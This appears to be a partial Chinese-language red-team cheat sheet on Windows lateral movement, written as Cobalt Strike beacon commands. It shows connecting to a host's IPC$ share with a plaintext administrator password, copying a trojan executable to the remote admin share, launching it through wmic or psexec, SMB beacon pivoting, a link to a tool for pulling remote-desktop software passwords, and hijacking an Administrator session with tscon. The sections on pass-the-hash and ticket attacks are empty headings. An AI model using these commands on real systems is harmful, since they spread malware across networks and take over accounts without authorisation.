## 0x00 碰见的横向移动方法总结1_IPC（部分，慢慢更新）

    主机开启139和445端口，IPC移动  
    shell net use \\192.168.10.23\ipc$ "Psft24680!!@@62##" /user:"Administrator"  
    
    在本地传个马，copy过去    
    shell copy C:\\Windows\\Temp\\ma.exe \\192.168.10.23\c$\Windows\Temp\ma.exe
      
    wmic远程执行 
    shell wmic /node:192.168.10.23 /user:Administrator /password:Psft24680!!@@62## process call create "cmd.exe /c C:\\Windows\\Temp\\ma.exe"
    
    也可以使用psexec进行远程执行
    
    psexec.exe -accepteula \\192.168.41.150 -h -d c:\wanli.exe
    
    如果发现很久没有上线，可能目标不出网
 ## 0x01 横向移动方法总结2_beacon
 
    SMB Beacon使用命名管道和父级命名管道进行通信,所以利用他可进行横向移动
    
    使用条件
    
    使用SMB的主机必修接受445端口打开
    只能链接由同一Cobalt Strike实例管理的Beacon
## 0x02 横向移动方法3_PTH攻击
    前提开启445端口

## 0x03 横向移动方法4_票据攻击

## 0x04 横向移动方法5_远控攻击

  远控攻击就是给目标装一些免安装的远控软件，例如：向日葵、todesk

  https://github.com/wafinfo/Sunflower_get_Password
  
  
## 0x05 其他横向技巧

  Windows Server 2012及以上不提取密码登录Administrator桌面（登录这个桌面目的是看看Administrator桌面有啥，方便横向）
  
  2012及高版本想要得到密码，只能通过修改注册表，然后让管理员重新登录主机才能得到密码，一般服务器重新进行登录时候很少。我们可以通过一些技巧得到Administrator权限，
  
  拿到shell后，whoami是system权限，可以添加用户后，上隧道把远程桌面代理出来，此时的权限仍然是system权限
  
  此时想要得到Administrator权限步骤如下：
  
  1.psexec启动一个system权限的cmd  命令：psexec.exe -s -i cmd.exe  
  
  2.query user 
  
  3.查看administrator会话id   
  
  4.tscon 1 切换会话id为Administrator权限
  
  
  
  
  


